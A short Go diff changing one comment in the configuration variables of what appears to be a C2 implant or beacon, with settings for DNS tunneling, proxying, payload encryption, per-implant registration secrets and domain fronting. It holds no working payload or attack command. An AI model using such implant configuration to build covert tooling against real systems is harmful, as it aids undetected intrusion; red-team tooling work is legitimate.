@@ -36,7 +36,7 @@ var (
 	DNSIPv6              bool     = false                         // enable IPv6 AAAA record tunneling
 	ProxyStr             string   = ""                            // HTTP proxy URL (e.g. "http://proxy:8080")
 	CryptoKeyStr         string   = ""                            // 32-byte hex key for beacon payload encryption ("" = disabled)
-	BeaconKeyStr         string   = ""                            // pre-shared key sent as envelope "key" and X-Beacon-Key header ("" = no PSK auth)
+	BeaconKeyStr         string   = ""                            // pre-shared key used to derive registration auth ("" = no PSK auth)
 	RegSecretIDStr       string   = ""                            // v3: per-implant registration secret id ("" = v2 master-key derivation)
 	RegSecretStr         string   = ""                            // v3: per-implant registration secret, base64 ("" = v2 master-key derivation)
 	DomainFront          string   = ""                            // Domain fronting: override HTTP Host header ("" = disabled)
